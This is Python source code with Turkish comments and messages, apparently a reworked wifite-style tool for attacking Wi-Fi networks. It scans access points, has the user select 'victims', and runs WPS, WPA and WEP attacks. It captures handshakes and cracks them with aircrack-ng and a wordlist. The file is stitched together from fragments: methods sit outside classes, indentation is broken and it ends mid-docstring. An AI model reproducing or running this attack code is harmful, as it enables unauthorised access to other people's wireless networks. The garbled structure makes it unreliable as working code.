    print(f"{GR}\n [+] {G}Tarama{W} ({G}{iface}{W}), her 1 saniyede bir güncellenir, {G}CTRL+C{W} işlemi sonlandırır.\n")
    
    # Başlıkları yazdır
    header = "   NUM ESSID                 "
    if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
        header += "BSSID              "
    header += "CH  ENCR  POWER  WPS?  CLIENT"
    print(header)
    print("   --- --------------------  -----------------  --  ----  -----  ----  ------")
    
    # Hedef bilgilerini yazdır
    for i, target in enumerate(targets):
        ssid_display = format_ssid(target.ssid, target.bssid)
        bssid_display = f"{O}{target.bssid}{W}" if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ""
        channel_display = f"{G}{target.channel.rjust(3)}{W}"
        encryption_display = f"{G if 'WEP' in target.encryption else O}{target.encryption.strip().ljust(4)}{W}"
        power_display = format_power(target.power)
        wps_display = format_wps(target.wps)
        client_count_display = format_client_count(target.bssid)
        
        # Hedef bilgilerini biçimlendirilmiş olarak yazdır
        print(f"   {G}{i + 1:2d}{W} {ssid_display} {bssid_display} {channel_display} {encryption_display} {power_display} {wps_display} {client_count_display}")
    
    # Tarama sonuçlarının özeti
    gecen_sure = sec_to_hms(time.time() - baslangic_zamani)
    toplam_targets = len(targets)
    toplam_clients = len(clients)
    
    ozet = (f' {GR}{gecen_sure}{W} {G}tarama{W}: {G}{toplam_targets}{W} hedef{"" if toplam_targets == 1 else "ler"} '
            f've {G}{toplam_clients}{W} istemci{"" if toplam_clients == 1 else "ler"} bulundu   \r')
    print(ozet)
    
    # İşlemi sonlandır ve gerekli temizliği yap
    stdout.flush()
    try:
        send_interrupt(proc)
        os.kill(proc.pid, SIGTERM)
    except (OSError, UnboundLocalError):
        pass

    # WPS uyumluluğunu kontrol et (tshark kullanarak)
    if not self.RUN_CONFIG.WPS_DISABLE:
        wps_check_targets(targets, cap_file)

    # Airodump dosyalarını temizle
    remove_airodump_files(airodump_file_prefix)

    if not targets:
        print(f"{R} [!] {O}Hedef bulunamadı!{W}")
        print(f"{R} [!] {O}Hedeflerin görünmesi için biraz beklemeniz gerekebilir.{W}\n")
        self.RUN_CONFIG.exit_gracefully(1)

    if self.RUN_CONFIG.VERBOSE_APS:
        os.system('clear')

    # Hedefleri sinyal gücüne göre sırala
    targets = sorted(targets, key=lambda t: t.power, reverse=True)

    victims = []
    print(f"   NUM ESSID                 {'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''}CH  ENCR  POWER  WPS?  CLIENT")
    print(f"   --- --------------------  {'-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''}--  ----  -----  ----  ------")
    
    for i, target in enumerate(targets):
        ssid_display = format_ssid(target.ssid, target.bssid)
        bssid_display = f"{O}{target.bssid}{W}" if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ""
        channel_display = f"{G}{target.channel.rjust(3)}{W}"
        encryption_display = f"{G if 'WEP' in target.encryption else O}{target.encryption.strip().ljust(4)}{W}"
        power_display = format_power(target.power)
        wps_display = format_wps(target.wps)
        client_count_display = format_client_count(target.bssid)
        
        print(f"   {G}{i + 1:2d}{W} {ssid_display} {bssid_display} {channel_display} {encryption_display} {power_display} {wps_display} {client_count_display}")

    # Kullanıcıdan hedef seçim bilgisi al
    ri = raw_input(
        f"{GR}\n [+]{W} {G}Hedef numaralarını{W} ({G}1-{len(targets)}{W}) virgülle ayrılmış olarak seçin veya '{G}all{W}' yazın: ")
    
    if ri.strip().lower() == 'all':
        victims = targets[:]
    else:
        try:
            selected_indexes = [int(x.strip()) for x in ri.split(',') if x.strip().isdigit()]
            victims = [targets[i - 1] for i in selected_indexes if 1 <= i <= len(targets)]
        except ValueError:
            print(f"{R} [!] {O}Geçersiz giriş! Lütfen geçerli numaraları girin.{W}")
            return None
    
    return victims

def hedef_seçimi(self, targets, clients):
    """
    Kullanıcının tarama sonuçlarından hedefleri seçmesini sağlar. Kullanıcı hedefleri numara aralıkları veya
    tek tek seçebilir. Seçim işleminde hata kontrolü yapılır ve geçersiz girişler kullanıcıya bildirilir.

    Parametreler:
        targets (list): Tarama sonuçları olarak bulunan erişim noktalarının listesi.
        clients (list): Erişim noktalarına bağlı istemcilerin listesi.

    Dönüş:
        tuple: Seçilen hedefler ve istemciler.
    """
    ri = input(
        f"{GR}\n [+]{W} Hedef numaralarını ({G}1-{len(targets)}{W}) virgülle ayrılmış olarak seçin veya '{G}all{W}' yazın: "
    ).strip().lower()

    victims = []

    if ri == 'all':
        victims = targets[:]
    else:
        for r in ri.split(','):
            r = r.strip()
            if '-' in r:
                # Aralık seçimi
                try:
                    sx, sy = r.split('-')
                    x, y = int(sx), int(sy) + 1
                    if x < 1 or y > len(targets):
                        print(f"{O} [!]{R} Belirtilen aralık geçersiz: {O}{r}{W}")
                        continue
                    victims.extend(targets[x - 1:y])
                except ValueError:
                    print(f"{O} [!]{R} Geçersiz aralık formatı: {O}{r}{W}")
            elif r.isdigit():
                # Tekil seçim
                index = int(r) - 1
                if 0 <= index < len(targets):
                    victims.append(targets[index])
                else:
                    print(f"{O} [!]{R} Geçersiz numara: {O}{r}{W}")
            elif r:
                print(f"{O} [!]{R} Geçersiz giriş: {O}{r}{W}")

    if not victims:
        print(f"{O}\n [!]{R} Hiç hedef seçilmedi.{W}")
        self.RUN_CONFIG.exit_gracefully(0)

    print(f"\n [+] {G}{len(victims)}{W} hedef seçildi{'' if len(victims) == 1 else 'ler'}.")

    return victims, clients

def başlat(self):
    """
    Tarama işlemini başlatır ve kullanıcının hedeflerini seçmesini sağlar. Tarama sonucunda elde edilen hedefleri
    kontrol eder ve daha önce kırılmış hedefler için kullanıcıya bilgi verir. Kullanıcının seçimine göre uygun
    işlemleri gerçekleştirir.
    """
    # Geçici dosya ve dizin oluşturma
    self.RUN_CONFIG.CreateTempFolder()

    # Argümanları işleme ve gerekli doğrulamaları yapma
    self.RUN_CONFIG.handle_args()
    self.RUN_CONFIG.ConfirmRunningAsRoot()
    self.RUN_CONFIG.ConfirmCorrectPlatform()

    # Gerekli programların kurulu olduğunu kontrol et
    self.initial_check()

    # Monitor modunda bir arayüz sağlandıysa onu kullan
    iface = self.RUN_CONFIG.MONITOR_IFACE if self.RUN_CONFIG.MONITOR_IFACE != '' else self.get_iface()
    self.RUN_CONFIG.THIS_MAC = get_mac_address(iface)  # Şu anki MAC adresini sakla

    # Tarama işlemini başlat
    (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)

    try:
        # Hedefleri kontrol et ve kullanıcıya tekrar kırma seçeneği sun
        index = 0
        while index < len(targets):
            target = targets[index]
            
            # Daha önce kırılmış bir hedef varsa, kullanıcıyı bilgilendir
            for already in self.RUN_CONFIG.CRACKED_TARGETS:
                if already.bssid == target.bssid:
                    if self.RUN_CONFIG.SHOW_ALREADY_CRACKED:
                        print(f"{R}\n [!]{O} Bu erişim noktasının anahtarını zaten kırdınız!{W}")
                        print(f"{R} [!] {C}{already.ssid}{W}: \"{G}{already.key}{W}\"")
                        ri = input(
                            f"{GR} [+]{W} Bu erişim noktasını tekrar kırmak ister misiniz? ({G}y/{O}n{W}): "
                        ).strip().lower()
                        if ri == 'n':
                            targets.pop(index)
                            index -= 1
                    else:
                        targets.pop(index)
                        index -= 1
                    break

            # Var olan handshake dosyasını kontrol et ve kullanıcıya seçenekler sun
            handshake_file = os.path.join(
                self.RUN_CONFIG.WPA_HANDSHAKE_DIR, 
                f"{re.sub(r'[^a-zA-Z0-9]', '', target.ssid)}_{target.bssid.replace(':', '-')}.cap"
            )
            if os.path.exists(handshake_file):
                print(f"{R}\n [!]{O} {C}{target.ssid}{W} için zaten bir handshake dosyanız var:")
                print(f"        {G}{handshake_file}{W}")
                ri = input(
                    f"{GR} [+]{W} {G}[s]{W}kip, {O}[c]{W}apture again, veya {R}[o]{W}verwrite? (s/c/o): "
                ).strip().lower()
                
                while ri not in {'s', 'c', 'o'}:
                    ri = input(
                        f"{GR} [+]{W} {G}s{W}, {O}c{W}, veya {R}o{W} girin: "
                    ).strip().lower()

                if ri == 's':
                    targets.pop(index)
                    index -= 1
                elif ri == 'o':
                    remove_file(handshake_file)
                    continue
            index += 1

    except KeyboardInterrupt:
        print("\nTarama durduruldu.")
        send_interrupt(proc)
        try:
            os.kill(proc.pid, SIGTERM)
        except (OSError, UnboundLocalError):
            pass

    # Kullanıcıya hedef seçim ekranı
    victims, clients = self.hedef_seçimi(targets, clients)
    
    # Kalan işlemler...


def saldırıları_başlat(self, targets, clients, iface):
    """
    Hedeflere karşı WPA ve WEP şifreleme türlerine uygun saldırıları başlatır.
    Saldırıları yönetir, başarılı olanları ve başarısız olanları izler ve kullanıcıya detaylı bilgi verir.

    Parametreler:
        targets (list): Tarama sonuçlarından elde edilen hedefler (erişim noktaları).
        clients (list): Erişim noktalarına bağlı istemciler.
        iface (str): Kullanılan ağ arayüzü.
    """
    try:
        # Başlangıçta bazı değişkenleri sıfırla
        wpa_success = 0
        wep_success = 0
        wpa_total = 0
        wep_total = 0

        self.RUN_CONFIG.TARGETS_REMAINING = len(targets)
        print(GR + " [+] İşlem başlatıldı, toplam hedef sayısı: %d" % len(targets) + W)

        # Her hedef üzerinde döngü başlat
        for t in targets:
            self.RUN_CONFIG.TARGETS_REMAINING -= 1

            # Hedefe bağlı istemcileri topla
            ts_clients = [c for c in clients if c.station == t.bssid]

            print('')
            print(f"{GR} [+] İşleniyor: {W} Hedef BSSID: {G}{t.bssid}{W} SSID: {C}{t.ssid if t.ssid else 'Gizli'}{W}")
            print(f"{GR} [+] Şifreleme Türü: {W}{t.encryption}{W}")

            # WPA şifreleme türü için işlemler
            if 'WPA' in t.encryption:
                need_handshake = True
                if not self.RUN_CONFIG.WPS_DISABLE and t.wps:
                    print(GR + " [+] WPS saldırısı başlatılıyor..." + W)
                    wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)
                    need_handshake = not wps_attack.RunAttack()
                    wpa_total += 1

                if not need_handshake and self.RUN_CONFIG.PIXIE:
                    print(GR + " [+] WPA şifresi başarıyla kırıldı." + W)
                    wpa_success += 1

                if not self.RUN_CONFIG.PIXIE and not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
                    print(GR + " [+] WPA saldırısı başlatılıyor..." + W)
                    wpa_total += 1
                    wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
                    if wpa_attack.RunAttack():
                        print(GR + " [+] WPA saldırısı başarılı!" + W)
                        wpa_success += 1
                    else:
                        print(R + " [!] WPA saldırısı başarısız oldu." + W)
                else:
                    print(R + " [!] WPA saldırısı kapalı ya da gerekli handshake bulunamadı." + W)

            # WEP şifreleme türü için işlemler
            elif 'WEP' in t.encryption:
                print(GR + " [+] WEP saldırısı başlatılıyor..." + W)
                wep_total += 1
                wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)
                if wep_attack.RunAttack():
                    print(GR + " [+] WEP saldırısı başarılı!" + W)
                    wep_success += 1
                else:
                    print(R + " [!] WEP saldırısı başarısız oldu." + W)

            # Bilinmeyen şifreleme türleri için uyarı
            else:
                print(f"{R} [!] Bilinmeyen şifreleme türü: {t.encryption}{W}")

            # Kullanıcı durdurma talebi varsa döngüden çık
            if self.RUN_CONFIG.TARGETS_REMAINING <= 0:
                print(f"{R} [!] Tüm hedefler işlenmiştir ya da saldırı durdurulmuştur.{W}")
                break

        # Saldırı sonuçlarını kullanıcıya bildir
        self._sonuçları_bildir(wpa_total, wpa_success, wep_total, wep_success)

        # WPA handshake dosyalarını kırma işlemi
        self._wpa_handshake_kırma()

    except KeyboardInterrupt:
        # Kullanıcı kesme (Ctrl+C) işlemi
        print(f'\n {R}(^C){O} kesildi{W}')
        self.RUN_CONFIG.exit_gracefully(0)

    except Exception as e:
        # Beklenmeyen hatalar için genel hata yakalama
        print(f"{R} [!] Beklenmeyen bir hata oluştu: {W}{e}")
        self.RUN_CONFIG.exit_gracefully(1)

    finally:
        # Sonuçları ve kapanış işlemleri
        print(f'{GR} [+] İşlem tamamlandı, tüm kaynaklar serbest bırakıldı.{W}')
        self.RUN_CONFIG.exit_gracefully(0)

def _sonuçları_bildir(self, wpa_total, wpa_success, wep_total, wep_success):
    """
    Saldırıların sonuçlarını kullanıcıya bildirir.

    Parametreler:
        wpa_total (int): WPA saldırılarının toplam sayısı.
        wpa_success (int): Başarılı WPA saldırılarının sayısı.
        wep_total (int): WEP saldırılarının toplam sayısı.
        wep_success (int): Başarılı WEP saldırılarının sayısı.
    """
    if wpa_total + wep_total > 0:
        print(f'\n {GR} [+] {G}{wpa_total + wep_total}{W} saldırı tamamlandı:{W}')

        if wpa_total > 0:
            if wpa_success == 0:
                print(f"{GR} [+]{R} {wpa_success}/{wpa_total} WPA saldırısı başarısız oldu.{W}")
            elif wpa_success == wpa_total:
                print(f"{GR} [+]{G} {wpa_success}/{wpa_total} WPA saldırısı başarıyla tamamlandı.{W}")
            else:
                print(f"{GR} [+]{O} {wpa_success}/{wpa_total} WPA saldırısı başarıyla tamamlandı.{W}")

            for finding in self.RUN_CONFIG.WPA_FINDINGS:
                print(f"        {C}{finding}{W}")

        if wep_total > 0:
            if wep_success == 0:
                print(f"{GR} [+]{R} {wep_success}/{wep_total} WEP saldırısı başarısız oldu.{W}")
            elif wep_success == wep_total:
                print(f"{GR} [+]{G} {wep_success}/{wep_total} WEP saldırısı başarıyla tamamlandı.{W}")
            else:
                print(f"{GR} [+]{O} {wep_success}/{wep_total} WEP saldırısı başarıyla tamamlandı.{W}")

            for finding in self.RUN_CONFIG.WEP_FINDINGS:
                print(f"        {C}{finding}{W}")

def _wpa_handshake_kırma(self):
    """
    WPA handshake dosyalarını kırma işlemini başlatır, eğer WPA cracker aktifse.
    """
    caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)
    if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:
        print(f"{GR} [+]{W} {G}WPA cracker{W} {G}{caps}{W} handshake üzerinde çalışıyor{W}")
        for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
            print(f"{GR} [+] WPA handshake dosyası: {W}{C}{cap}{W} üzerinde kırma işlemi başlatılıyor...")
            try:
                wpa_crack(cap, self.RUN_CONFIG)
                print(f"{GR} [+] WPA handshake dosyası: {W}{C}{cap}{W} kırma işlemi tamamlandı.")
            except Exception as e:
                print(f"{R} [!] WPA handshake dosyası: {C}{cap}{R} kırılırken hata oluştu: {W}{e}")

    else:
        print(f"{R} [!] WPA cracker devre dışı bırakıldı ya da kırılacak handshake dosyası bulunamadı.{W}")

# Ekstra fonksiyonlar ve yöntemler

def get_iface(self):
    """
    Ağ arayüzünü alır ve gerekli modda çalışmasını sağlar.
    """
    # Arayüz alım ve ayarları burada yapılacak
    pass

def remove_file(file_path):
    """
    Belirtilen dosyayı siler.

    Parametreler:
        file_path (str): Silinecek dosyanın yolu.
    """
    try:
        os.remove(file_path)
        print(f"{G} [+] Dosya başarıyla silindi: {C}{file_path}{W}")
    except FileNotFoundError:
        print(f"{R} [!] Dosya bulunamadı: {C}{file_path}{W}")
    except Exception as e:
        print(f"{R} [!] Dosya silinirken hata oluştu: {W}{e}")

def send_interrupt(proc):
    """
    İşlem sırasında kesme sinyali gönderir.

    Parametreler:
        proc (Popen): Kesilmesi gereken işlem.
    """
    try:
        proc.terminate()
        proc.wait()
        print(f"{R} [!] İşlem kesildi.{W}")
    except Exception as e:
        print(f"{R} [!] İşlem kesilirken hata oluştu: {W}{e}")

# Kullanıcı etkileşimi ve girdiler için yöntemler

def get_user_input(prompt, choices=None):
    """
    Kullanıcıdan girdi alır ve geçerliliğini kontrol eder.

    Parametreler:
        prompt (str): Kullanıcıya gösterilecek mesaj.
        choices (list): Geçerli seçimler (opsiyonel).

    Döner:
        str: Kullanıcının girdiği değer.
    """
    while True:
        user_input = input(prompt).strip().lower()
        if choices is None or user_input in choices:
            return user_input
        else:
            print(f"{R} [!] Geçersiz giriş. Lütfen geçerli bir seçim yapın.{W}")

# Çeşitli yardımcı fonksiyonlar

def is_valid_file(file_path):
    """
    Dosya yolunun geçerli olup olmadığını kontrol eder.

    Parametreler:
        file_path (str): Kontrol edilecek dosya yolu.

    Döner:
        bool: Dosyanın geçerli olup olmadığını belirten değer.
    """
    return os.path.isfile(file_path)

def ensure_directory_exists(directory_path):
    """
    Belirtilen dizinin var olup olmadığını kontrol eder ve gerekirse oluşturur.

    Parametreler:
        directory_path (str): Kontrol edilecek veya oluşturulacak dizin yolu.
    """
    if not os.path.exists(directory_path):
        os.makedirs(directory_path)
        print(f"{G} [+] Dizin başarıyla oluşturuldu: {C}{directory_path}{W}")
    else:
        print(f"{G} [+] Dizin zaten mevcut: {C}{directory_path}{W}")
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config

    def parse_csv(self, filename: str) -> Tuple[List['Target'], List['Client']]:
        """
        Verilen airodump-ng CSV dosyasını ayrıştırır ve hedefler ile istemciler hakkında kapsamlı bilgi toplar.

        Parametreler:
            filename (str): Ayrıştırılacak CSV dosyasının yolu.

        Döner:
            tuple: Hedeflerin ve istemcilerin bulunduğu iki liste.
        """
        if not os.path.exists(filename):
            print(f"{R} [!] Dosya bulunamadı: {filename}{W}")
            return ([], [])

        targets = []
        clients = []
        hit_clients = False

        try:
            with open(filename, 'r', encoding='utf-8') as csvfile:
                targetreader = csv.reader((line.replace('\0', '') for line in csvfile), delimiter=',')

                for row in targetreader:
                    # Yetersiz sütunlar varsa geç
                    if len(row) < 2:
                        print(f"{O} [*] Yetersiz sütunlar içeren satır atlandı: {row}{W}")
                        continue

                    # Hedef ve istemci bölümlerini ayır
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            print(f"{G} [+] İstemci verileri bölümü başlatıldı.{W}")
                            continue
                        if len(row) < 14:
                            print(f"{O} [*] Yetersiz sütunlar içeren hedef satırı atlandı: {row}{W}")
                            continue
                        if row[0].strip() == 'BSSID':
                            continue

                        # Şifreleme türünü belirle
                        enc = row[5].strip()
                        wps = False
                        if 'WPA' not in enc and 'WEP' not in enc:
                            print(f"{O} [*] Desteklenmeyen şifreleme türü atlandı: {enc}{W}")
                            continue
                        if self.RUN_CONFIG.WEP_DISABLE and 'WEP' in enc:
                            print(f"{O} [*] WEP şifrelemesi devre dışı bırakıldı: {enc}{W}")
                            continue
                        if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and 'WPA' in enc:
                            print(f"{O} [*] WPA/WPS şifrelemesi devre dışı bırakıldı: {enc}{W}")
                            continue
                        if enc in ["WPA2WPA", "WPA2 WPA"]:
                            enc = "WPA2"
                            wps = True
                        if len(enc) > 4:
                            enc = enc[4:].strip()
                        
                        # Güç ve SSID bilgisini al
                        power = int(row[8].strip())
                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]
                        
                        if power < 0:
                            power += 100
                        
                        # Hedef nesnesini oluştur ve listeye ekle
                        t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
                        t.wps = wps
                        targets.append(t)
                    else:
                        if len(row) < 6:
                            print(f"{O} [*] Yetersiz sütunlar içeren istemci satırı atlandı: {row}{W}")
                            continue
                        
                        # İstemci bilgilerini al
                        bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
                        station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
                        power = row[3].strip()
                        
                        if station != 'notassociated':
                            c = Client(bssid, station, power)
                            clients.append(c)
                        else:
                            print(f"{O} [*] İstemci verisi geçersiz veya ilişkili değil: {row}{W}")

        except IOError as e:
            print(f"{R} [!] I/O hatası ({e.errno}): {e.strerror}{W}")
        except Exception as e:
            print(f"{R} [!] Beklenmeyen bir hata oluştu: {W}{e}")

        print(f"{G} [+] CSV dosyası başarıyla ayrıştırıldı.{W}")
        print(f"    {G} Hedefler: {len(targets)}{W}")
        print(f"    {G} İstemciler: {len(clients)}{W}")

        return (targets, clients)

    def analyze_capfile(self, capfile: str) -> None:
        """
        Verilen CAP dosyasını analiz eder, çeşitli araçlar kullanarak el sıkışmalarını kontrol eder ve sonuçları ekrana yazdırır.

        Parametreler:
            capfile (str): Analiz edilecek CAP dosyasının yolu.
        """
        if not os.path.exists(capfile):
            print(f"{R} [!] Dosya bulunamadı: {capfile}{W}")
            return

        print(f"{GR} [+] CAP dosyası analiz ediliyor: {C}{capfile}{W}")

        # Tshark ile el sıkışmalarını kontrol et
        try:
            print(f"{G} [+] Tshark ile el sıkışmaları kontrol ediliyor...{W}")
            result = subprocess.run(['tshark', '-r', capfile, '-q', '-z', 'handshake'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{G} [+] Tshark el sıkışmaları kontrolü tamamlandı.{W}")
                print(result.stdout)
            else:
                print(f"{R} [!] Tshark komutunda hata oluştu: {W}{result.stderr}")
        except FileNotFoundError:
            print(f"{R} [!] Tshark bulunamadı. Lütfen Tshark'ın sistemde kurulu olduğundan emin olun.{W}")
        except subprocess.CalledProcessError as e:
            print(f"{R} [!] Tshark çalıştırılırken bir hata oluştu: {W}{e.output}")
        except Exception as e:
            print(f"{R} [!] Tshark çalıştırılırken beklenmeyen bir hata oluştu: {W}{e}")

        # WPA handshake dosyalarını kırma
        if self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
            print(f"{GR} [+] WPA handshake dosyaları kırılıyor...{W}")
            for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
                print(f"{G} [+] WPA handshake dosyası: {C}{cap}{W} kırılıyor...")
                self._crack_wpa_handshake(cap)

        # WEP handshake dosyalarını analiz etme
        if self.RUN_CONFIG.WEP_CAPS_TO_CRACK:
            print(f"{GR} [+] WEP handshake dosyaları analiz ediliyor...{W}")
            for cap in self.RUN_CONFIG.WEP_CAPS_TO_CRACK:
                print(f"{G} [+] WEP handshake dosyası: {C}{cap}{W} analiz ediliyor...")
                self._crack_wep_handshake(cap)

    def _crack_wpa_handshake(self, capfile: str) -> None:
        """
        Belirli bir WPA handshake dosyasını kırma işlemini başlatır ve sonuçları ekrana yazdırır.

        Parametreler:
            capfile (str): Kırılacak WPA handshake dosyasının yolu.
        """
        try:
            print(f"{G} [+] WPA handshake kırma başlatılıyor: {C}{capfile}{W}")
            result = subprocess.run(['aircrack-ng', capfile, '-w', self.RUN_CONFIG.WORDLIST], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{G} [+] WPA handshake dosyası: {C}{capfile}{W} başarıyla kırıldı.")
                print(result.stdout)
            else:
                print(f"{R} [!] WPA kırma işlemi sırasında hata oluştu: {W}{result.stderr}")
        except FileNotFoundError:
            print(f"{R} [!] Aircrack-ng bulunamadı. Lütfen Aircrack-ng'ın sistemde kurulu olduğundan emin olun.{W}")
        except subprocess.CalledProcessError as e:
            print(f"{R} [!] Aircrack-ng çalıştırılırken bir hata oluştu: {W}{e.output}")
        except Exception as e:
            print(f"{R} [!] WPA handshake kırılırken beklenmeyen bir hata oluştu: {W}{e}")

    def _crack_wep_handshake(self, capfile: str) -> None:
        """
        Belirli bir WEP handshake dosyasını kırma işlemini başlatır ve sonuçları ekrana yazdırır.

        Parametreler:
            capfile (str): Kırılacak WEP handshake dosyasının yolu.
        """
        try:
            print(f"{G} [+] WEP handshake kırma başlatılıyor: {C}{capfile}{W}")
            result = subprocess.run(['aircrack-ng', capfile, '-w', self.RUN_CONFIG.WORDLIST], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{G} [+] WEP handshake dosyası: {C}{capfile}{W} başarıyla kırıldı.")
                print(result.stdout)
            else:
                print(f"{R} [!] WEP kırma işlemi sırasında hata oluştu: {W}{result.stderr}")
        except FileNotFoundError:
            print(f"{R} [!] Aircrack-ng bulunamadı. Lütfen Aircrack-ng'ın sistemde kurulu olduğundan emin olun.{W}")
        except subprocess.CalledProcessError as e:
            print(f"{R} [!] Aircrack-ng çalıştırılırken bir hata oluştu: {W}{e.output}")
        except Exception as e:
            print(f"{R} [!] WEP handshake kırılırken beklenmeyen bir hata oluştu: {W}{e}")
       class NetworkAnalyzer:
    def __init__(self, run_config):
        """
        NetworkAnalyzer sınıfının başlatıcısı.

        Parametreler:
            run_config (RunConfig): Ağ tarama ve saldırı yapılandırmalarını içeren bir yapılandırma nesnesi.
        """
        self.RUN_CONFIG = run_config
        self.setup_logging()
        logging.info('NetworkAnalyzer başlatıldı.')

    def setup_logging(self):
        """
        Loglama yapılandırmasını yapar. Log dosyası ve format ayarlarını içerir.
        """
        logging.basicConfig(
            filename='network_analyzer.log',
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        logging.info('Loglama başlatıldı.')

    def check_handshakes(self, capfile: str) -> None:
        """
        Belirtilen CAP dosyasını kontrol eder ve WPA handshake'lerini çeşitli programlar kullanarak tespit eder.
        
        CAP dosyasını analiz ederken çeşitli araçlarla el sıkışmalarını kontrol eder ve her bir programın sonucunu kullanıcıya bildirir.

        Parametreler:
            capfile (str): Analiz edilecek CAP dosyasının yolu.
        """
        wpa_attack = WPAAttack(None, None, None, None)

        if not self.RUN_CONFIG.TARGET_ESSID and not self.RUN_CONFIG.TARGET_BSSID:
            logging.error('Hedef ESSID ve BSSID belirtilmelidir.')
            print(f"{R} [!]{O} Hedef ESSID ve BSSID belirtilmelidir.")
            print(f"{R} [!]{O} Lütfen ESSID'yi (-e <isim>) ve/veya hedef BSSID'yi (-b <mac>) girin.\n")
            self.RUN_CONFIG.exit_gracefully(1)

        if not self.RUN_CONFIG.TARGET_BSSID:
            self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)
            if not self.RUN_CONFIG.TARGET_BSSID:
                logging.warning('ESSID’den BSSID tahmin edilemedi!')
                print(f"{R} [!]{O} ESSID'den BSSID tahmin edilemedi!")
            else:
                logging.info(f'Tahmin edilen BSSID: {self.RUN_CONFIG.TARGET_BSSID}')
                print(f"{GR} [+]{W} Tahmin edilen BSSID: {G}{self.RUN_CONFIG.TARGET_BSSID}{W}")

        if self.RUN_CONFIG.TARGET_BSSID and not self.RUN_CONFIG.TARGET_ESSID:
            self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)

        print(f"{GR} [+]{W} El sıkışmalarını kontrol ediyor: {G}{capfile}{W}")

        t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)

        self.check_program('pyrit', wpa_attack.has_handshake_pyrit, t, capfile)
        self.check_program('cowpatty', wpa_attack.has_handshake_cowpatty, t, capfile, nonstrict=True)
        self.check_program('cowpatty', wpa_attack.has_handshake_cowpatty, t, capfile, nonstrict=False)
        self.check_program('tshark', wpa_attack.has_handshake_tshark, t, capfile)
        self.check_program('aircrack-ng', wpa_attack.has_handshake_aircrack, t, capfile)

        print('')
        logging.info('Handshake kontrolü tamamlandı.')
        self.RUN_CONFIG.exit_gracefully(0)

    def check_program(self, program_name: str, method, target: 'Target', capfile: str, *args) -> None:
        """
        Belirtilen programı kontrol eder ve el sıkışmalarını tespit eder.

        Programın varlığını doğrular ve el sıkışmalarını kontrol eden metod ile sonucu kullanıcıya bildirir.

        Parametreler:
            program_name (str): Kontrol edilecek programın adı.
            method (callable): El sıkışmalarını kontrol eden metod.
            target (Target): Hedef ağ bilgilerini içeren nesne.
            capfile (str): Analiz edilecek CAP dosyasının yolu.
            *args: Ekstra argümanlar.
        """
        logging.info(f'Program kontrol ediliyor: {program_name}')
        if program_exists(program_name):
            try:
                result = method(target, capfile, *args)
                if result:
                    logging.info(f'{program_name} kullanılarak el sıkışmalarının bulunduğu rapor edildi.')
                    print(f"{GR} [+]{W} {G}{program_name}{W}:\t\t\t {G}Bulundu!{W}")
                else:
                    logging.info(f'{program_name} kullanılarak el sıkışmalarının bulunamadığı rapor edildi.')
                    print(f"{GR} [+]{W} {G}{program_name}{W}:\t\t\t {O}Bulunamadı{W}")
            except Exception as e:
                logging.error(f'{program_name} programı kullanılırken bir hata oluştu: {e}')
                print(f"{R} [!]{O} {program_name} programı kullanılırken bir hata oluştu: {e}")
        else:
            logging.error(f'Program bulunamadı: {program_name}')
            print(f"{R} [!]{O} Program bulunamadı: {program_name}")

def rename(old: str, new: str) -> None:
    """
    'old' dosyasını 'new' olarak yeniden adlandırır, farklı bölümlerle çalışır.

    Parametreler:
        old (str): Eski dosya adı.
        new (str): Yeni dosya adı.
    """
    try:
        logging.info(f'Dosya {old} olarak {new} olarak yeniden adlandırılıyor.')
        os.rename(old, new)
        logging.info(f'Dosya {old} olarak {new} olarak başarıyla yeniden adlandırıldı.')
    except OSError as e:
        logging.error(f'Dosya yeniden adlandırma hatası: {e}')
        if e.errno == errno.EXDEV:
            logging.info(f'Dosya farklı bölümlerde; kopyalama ve silme işlemi başlatılıyor.')
            try:
                shutil.copy(old, new)
                os.unlink(old)
                logging.info(f'Dosya {old} olarak {new} olarak kopyalandı ve eski dosya silindi.')
            except Exception as ex:
                logging.error(f'Dosya kopyalama veya silme hatası: {ex}')
                os.unlink(new)
                raise ex
        else:
            logging.error(f'Genel hata: {e}')
            raise e

# Helper functions
def program_exists(program_name: str) -> bool:
    """
    Belirtilen programın sistemde mevcut olup olmadığını kontrol eder.

    Parametreler:
        program_name (str): Kontrol edilecek programın adı.

    Returns:
        bool: Programın mevcut olup olmadığı.
    """
    return shutil.which(program_name) is not None

def get_bssid_from_cap(essid: str, capfile: str) -> str:
    """
    CAP dosyasından verilen ESSID'ye göre BSSID'yi tahmin eder.

    Parametreler:
        essid (str): Hedef ESSID.
        capfile (str): CAP dosyasının yolu.

    Returns:
